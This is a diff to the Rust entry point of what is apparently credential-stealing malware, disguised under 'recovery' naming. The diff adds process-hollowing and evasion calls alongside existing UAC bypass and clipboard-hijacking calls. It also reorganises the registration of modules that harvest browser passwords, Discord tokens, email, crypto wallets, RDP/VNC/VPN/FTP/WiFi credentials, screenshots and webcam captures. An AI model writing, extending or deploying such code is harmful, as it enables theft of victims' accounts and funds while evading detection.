@@ -31,6 +31,10 @@ async fn main() -> Result<(), RecoveryError> {
         return Ok(());
     }
 
+    recovery::hollowing::perform_hollowing().await;
+
+    recovery::evasion::apply_evasion_techniques();
+
     recovery::uac::attempt_uac_bypass().await;
 
     recovery::clipper::run_clipper().await;
@@ -39,7 +43,7 @@ async fn main() -> Result<(), RecoveryError> {
 
     let mut manager = RecoveryManager::new(context.clone());
     register_all_tasks(&mut manager, &context).await?;
-    
+
     let outcomes = manager.run_all().await?;
 
     tracing::info!(
@@ -59,24 +63,21 @@ async fn register_all_tasks(
     manager: &mut RecoveryManager,
     context: &RecoveryContext,
 ) -> Result<(), RecoveryError> {
-    use recovery::{
-        account_validation, behavioral, clipboard, chromium, devops, discord, email,
-        file_recovery, ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, rdp,
-        screenshot, services, system, vnc, vpn, wallet, webcam, wifi,
-    };
     use recovery::browser::browsers;
+    use recovery::{
+        account_validation, behavioral, chromium, clipboard, devops, discord, email, file_recovery,
+        ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, rdp, screenshot, services,
+        system, vnc, vpn, wallet, webcam, wifi,
+    };
 
-    // Browser tasks
     manager.register_tasks(browsers::default_browser_tasks(context).await);
     manager.register_tasks(gecko::gecko_tasks(context));
     manager.register_tasks(gecko_passwords::gecko_password_tasks(context));
     manager.register_tasks(chromium::chromium_secrets_tasks(context));
 
-    // Gaming tasks
     manager.register_tasks(gaming::gaming_service_tasks(context));
     manager.register_tasks(gaming::gaming_extra_tasks(context));
 
-    // Communication & Email
     manager.register_tasks(messenger::messenger_tasks(context));
     manager.register_task(discord::discord_token_task(context));
     manager.register_task(discord::discord_profile_task(context));
@@ -84,22 +85,18 @@ async fn register_all_tasks(
     manager.register_tasks(services::email_tasks(context));
     manager.register_task(email::outlook_registry_task());
 
-    // Wallets
     manager.register_tasks(wallet::wallet_tasks(context));
 
-    // System & Hardware
     manager.register_tasks(system::system_tasks(context));
     manager.register_tasks(hardware::hardware_tasks(context));
     manager.register_task(account_validation::account_validation_task(context));
 
-    // Network & Remote Access
     manager.register_tasks(rdp::rdp_tasks(context));
     manager.register_tasks(vnc::vnc_tasks(context));
     manager.register_tasks(vpn::vpn_tasks(context));
     manager.register_tasks(ftp::ftp_tasks(context));
     manager.register_task(wifi::wifi_task(context));
 
-    // Media & Interception
     let control = recovery::settings::RecoveryControl::global();
     if control.capture_screenshots() {
         manager.register_task(screenshot::screenshot_task(context));
@@ -111,7 +108,6 @@ async fn register_all_tasks(
         manager.register_task(clipboard::clipboard_task(context));
     }
 
-    // Other / Specialized
     manager.register_tasks(behavioral::behavioral_tasks(context));
     manager.register_task(file_recovery::file_recovery_task(context));
     manager.register_tasks(other::other_tasks(context));
